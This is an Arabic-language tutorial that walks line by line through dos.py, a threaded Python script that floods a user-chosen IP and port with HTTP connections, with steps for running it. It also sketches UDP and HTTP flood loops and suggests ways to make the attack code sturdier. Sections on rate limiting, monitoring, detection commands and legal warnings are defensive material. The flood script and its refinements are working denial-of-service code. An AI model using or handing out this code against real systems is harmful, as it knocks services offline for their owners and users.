# 💥 هجوم Denial of Service (DoS) - dos.py

## 📋 نظرة عامة

هذا الملف يوضح كيفية تنفيذ هجوم Denial of Service بسيط. هذا الهجوم يهدف إلى تعطيل الخدمة عن طريق إرسال عدد كبير من الطلبات المتزامنة.

## 🔍 شرح مفصل للكود

### 📦 الاستيرادات
```python
import socket, threading
```
- **socket**: للاتصال الشبكي
- **threading**: لإنشاء خيوط متعددة للهجوم المتزامن

### 🎯 الحصول على معلومات الهدف
```python
target = input("Target IP: ")
port = int(input("Target Port: "))
```

**شرح كل سطر:**
- **target**: طلب عنوان IP الهدف من المستخدم
- **port**: طلب رقم البورت وتحويله إلى رقم صحيح

### ⚔️ دالة الهجوم
```python
def attack():
    while True:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.close()
            print("Sentdos to " + target + " on port " + str(port))
        except:
            pass
```

**شرح كل سطر:**
- **def attack()**: تعريف دالة الهجوم
- **while True**: حلقة لا نهائية لإرسال الطلبات باستمرار
- **try**: بداية معالجة الأخطاء
- **s = socket.socket()**: إنشاء socket جديد
- **s.connect((target, port))**: الاتصال بالهدف
- **s.send(b"...")**: إرسال طلب HTTP GET
- **s.close()**: إغلاق الاتصال
- **print(...)**: طباعة رسالة تأكيد
- **except**: تجاهل أي أخطاء
- **pass**: عدم فعل شيء في حالة الخطأ

### 🔄 إنشاء خيوط الهجوم
```python
for i in range(100): 
    t = threading.Thread(target=attack)
    t.start()
```

**شرح كل سطر:**
- **for i in range(100)**: إنشاء 100 خيط
- **t = threading.Thread(target=attack)**: إنشاء خيط جديد يستدعي دالة attack
- **t.start()**: بدء تشغيل الخيط

## 🚀 كيفية التنفيذ

### 1. تشغيل الهجوم
```bash
python3 dos.py
```

### 2. إدخال معلومات الهدف
```
Target IP: 192.168.1.100
Target Port: 80
```

### 3. إيقاف الهجوم
اضغط `Ctrl+C` لإيقاف الهجوم

## ⚠️ الثغرات في الكود

### 1. عدم وجود تحقق من المدخلات
```python
target = input("Target IP: ")  # لا يتحقق من صحة عنوان IP
port = int(input("Target Port: "))  # قد يسبب خطأ إذا أدخل المستخدم نص
```

### 2. معالجة أخطاء ضعيفة
```python
except:
    pass  # تجاهل جميع الأخطاء بدون تسجيلها
```

### 3. رسائل غير واضحة
```python
print("Sentdos to " + target + " on port " + str(port))  # خطأ إملائي
```

### 4. عدم وجود حد للهجوم
الهجوم يستمر إلى ما لا نهاية بدون إيقاف

## 🛡️ طرق الحماية من DoS

### 1. Rate Limiting
```python
# مثال على Rate Limiting
import time
from collections import defaultdict

request_count = defaultdict(int)
last_reset = time.time()

def check_rate_limit(ip):
    current_time = time.time()
    if current_time - last_reset > 60:  # إعادة تعيين كل دقيقة
        request_count.clear()
    
    if request_count[ip] > 100:  # حد أقصى 100 طلب في الدقيقة
        return False
    
    request_count[ip] += 1
    return True
```

### 2. CAPTCHA
```html
<form>
    <input type="text" name="captcha" required>
    <img src="captcha.php" alt="CAPTCHA">
</form>
```

### 3. DDoS Protection Services
- Cloudflare
- AWS Shield
- Google Cloud Armor

### 4. Load Balancing
توزيع الحمل على عدة خوادم

### 5. Monitoring
```python
# مراقبة عدد الطلبات
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def log_request(ip, path):
    logger.info(f"Request from {ip} to {path}")
```

## 🔍 اكتشاف هجوم DoS

### 1. مراقبة عدد الطلبات
```bash
# مراقبة الاتصالات النشطة
netstat -an | grep :80 | wc -l
```

### 2. مراقبة استخدام الموارد
```bash
# مراقبة استخدام CPU
top
# مراقبة استخدام الذاكرة
free -h
```

### 3. تحليل السجلات
```bash
# مراقبة سجلات الويب
tail -f /var/log/apache2/access.log
```

## 📊 أنواع هجمات DoS

### 1. SYN Flood
```python
# مثال على SYN Flood
import socket

def syn_flood(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    # إرسال حزم SYN مزورة
```

### 2. UDP Flood
```python
# مثال على UDP Flood
def udp_flood(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        s.sendto(b"X" * 1024, (target, port))
```

### 3. HTTP Flood
```python
# مثال على HTTP Flood
import requests

def http_flood(target):
    while True:
        try:
            requests.get(target)
        except:
            pass
```

## 🛡️ تحسينات مقترحة للكود

### 1. إضافة تحقق من المدخلات
```python
import re

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    
    parts = ip.split('.')
    return all(0 <= int(part) <= 255 for part in parts)

target = input("Target IP: ")
if not validate_ip(target):
    print("Invalid IP address!")
    exit(1)
```

### 2. إضافة حد زمني
```python
import time

start_time = time.time()
timeout = 60  # 60 ثانية

def attack():
    while time.time() - start_time < timeout:
        # ... كود الهجوم
```

### 3. تحسين معالجة الأخطاء
```python
def attack():
    while True:
        try:
            s = socket.socket()
            s.settimeout(5)  # timeout 5 ثواني
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.close()
            print(f"Sent DoS to {target} on port {port}")
        except socket.timeout:
            print("Connection timeout")
        except ConnectionRefusedError:
            print("Connection refused")
        except Exception as e:
            print(f"Error: {e}")
```

## ⚖️ الجوانب القانونية

- هجمات DoS غير قانونية ضد أنظمة أخرى
- استخدم فقط على أنظمة خاصة بك
- قد تؤدي إلى عواقب قانونية خطيرة
- احصل على إذن مكتوب قبل الاختبار 